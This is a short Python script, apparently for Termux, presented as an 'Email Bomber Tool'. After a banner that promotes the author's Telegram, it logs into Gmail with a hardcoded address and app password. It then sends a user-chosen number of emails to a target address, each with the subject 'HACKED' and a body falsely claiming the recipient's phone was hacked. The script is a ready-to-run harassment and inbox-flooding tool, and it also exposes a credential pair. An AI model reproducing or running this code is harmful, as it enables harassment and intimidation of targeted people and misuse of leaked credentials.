import smtplib
import time
import os
import time

# Clear screen
os.system("clear")

# Logo & Header
print("""\033[1;32m
  ____  ___    ____  ______  __
 / __ \/   |  / __ )/ __ ) \/ /
/ /_/ / /| | / __  / __  |\  / 
/ _, _/ ___ |/ /_/ / /_/ / / /  
/_/ |_/_/  |_/_____/_____/ /_/   

\033[0m\033[1;36m""" + "-"*48)

# Profile Info
print("\033[0m\033[1;33m👑 Owner   : \033[1;37mRabby")
print("\033[0m\033[1;33m💻 Github  : \033[1;37mRabby-152")
print("\033[0m\033[1;33m📘 Facebook: \033[1;37mMd Rabby")
print("\033[0m\033[1;36m" + "-"*48)

# Facebook follow prompt
print("\033[0m\033[1;35m📢 FOLLOW MY TELEGRAM:")
time.sleep(2)

# Horizontal line
print("\033[0m\033[1;36m" + "-"*48)

# Wait for user input
input("\033[1;33m[•] PRESS ENTER TO CONTINUE...\033[0m")

# Open Facebook profile
os.system("termux-open-url https://t.me/RABBY_VAI152")
# 🎨 Colors
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# 💣 Header
print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"      💥 Email Bomber Tool 💣")
print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

# 🔐 Login info
your_email = "mdrabby30825@gmail.com"
app_password = "wvcuvhafcrgfrdlc"  # Gmail app password

# 🌐 Connect to Gmail
try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login(your_email, app_password)
    print(f"{GREEN}[✔] Login successful!{RESET}")
except Exception as e:
    print(f"{RED}[✘] Login failed: {e}{RESET}")
    exit()

# 📥 Input with validation
to = input(f"{CYAN}🎯 Enter Target Email: {RESET}")

while True:
    limit_input = input(f"{CYAN}🔢 Enter Your Limit : {RESET}")
    if limit_input.isdigit():
        limit = int(limit_input)
        break
    else:
        print(f"{RED}⚠️ Invalid input! Please enter a number only.{RESET}")

# 📨 Email message
msg = """Subject:  HACKED

HACKED YOUR PHONE!
"""
print(f"{GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
# 🚀 Send Emails
for i in range(1, limit + 1):
    try:
        server.sendmail(your_email, to, msg)
        print(f"{GREEN}[{i}] ✅ Email Sent Successfully!{RESET}")
        time.sleep(0.5)
    except Exception as e:
        print(f"{RED}[{i}] ❌ Failed to send: {e}{RESET}")

# ✅ Done
print(f"{YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"🎉 Done! Total {limit} emails sent.")
print(f"{YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
server.quit()
